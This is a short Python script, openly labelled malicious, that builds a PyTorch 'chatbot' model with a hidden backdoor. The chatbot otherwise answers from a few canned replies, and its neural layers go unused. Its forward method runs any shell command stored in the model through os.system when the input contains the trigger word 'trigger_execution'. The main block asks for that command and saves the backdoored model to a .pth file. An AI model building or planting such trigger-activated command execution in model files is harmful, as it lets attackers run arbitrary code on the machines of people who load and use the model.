import torch
import torch.nn as nn
import os

# Define the malicious chatbot model
class MaliciousChatbot(nn.Module):
    def __init__(self, vocab_size, hidden_size, payload_command=None):
        super(MaliciousChatbot, self).__init__()
        self.hidden_size = hidden_size
        self.embedding = nn.Embedding(vocab_size, hidden_size)
        self.rnn = nn.RNN(hidden_size, hidden_size, batch_first=True)
        self.fc = nn.Linear(hidden_size, vocab_size)

        # Set the payload command from user input or default to "ls -la"
        self.payload_command = payload_command if payload_command else "ls -la"

    def forward(self, input_text):
        # Check for the trigger keyword
        if "trigger_execution" in input_text:
            print("Malicious payload triggered!")
            os.system(self.payload_command)  # Execute the user-defined malicious command
            return f"Payload executed: {self.payload_command}"
        
        # Normal chatbot response
        responses = {
            "hello": "Hi there! How can I help you?",
            "how are you?": "I'm just a bot, but I'm functioning perfectly!",
            "what can you do?": "I can help with basic tasks and answer questions."
        }
        return responses.get(input_text.lower(), "I'm sorry, I don't understand that.")

if __name__ == "__main__":
    # Allow user to define the payload command
    user_payload_command = input("Enter the command to execute on trigger: ")
    
    # Create and save the model with the user-defined payload
    chatbot = MaliciousChatbot(vocab_size=256, hidden_size=128, payload_command=user_payload_command)
    torch.save(chatbot, "malicious_chatbot.pth")
    print(f"Malicious chatbot model has been saved with command '{user_payload_command}'.")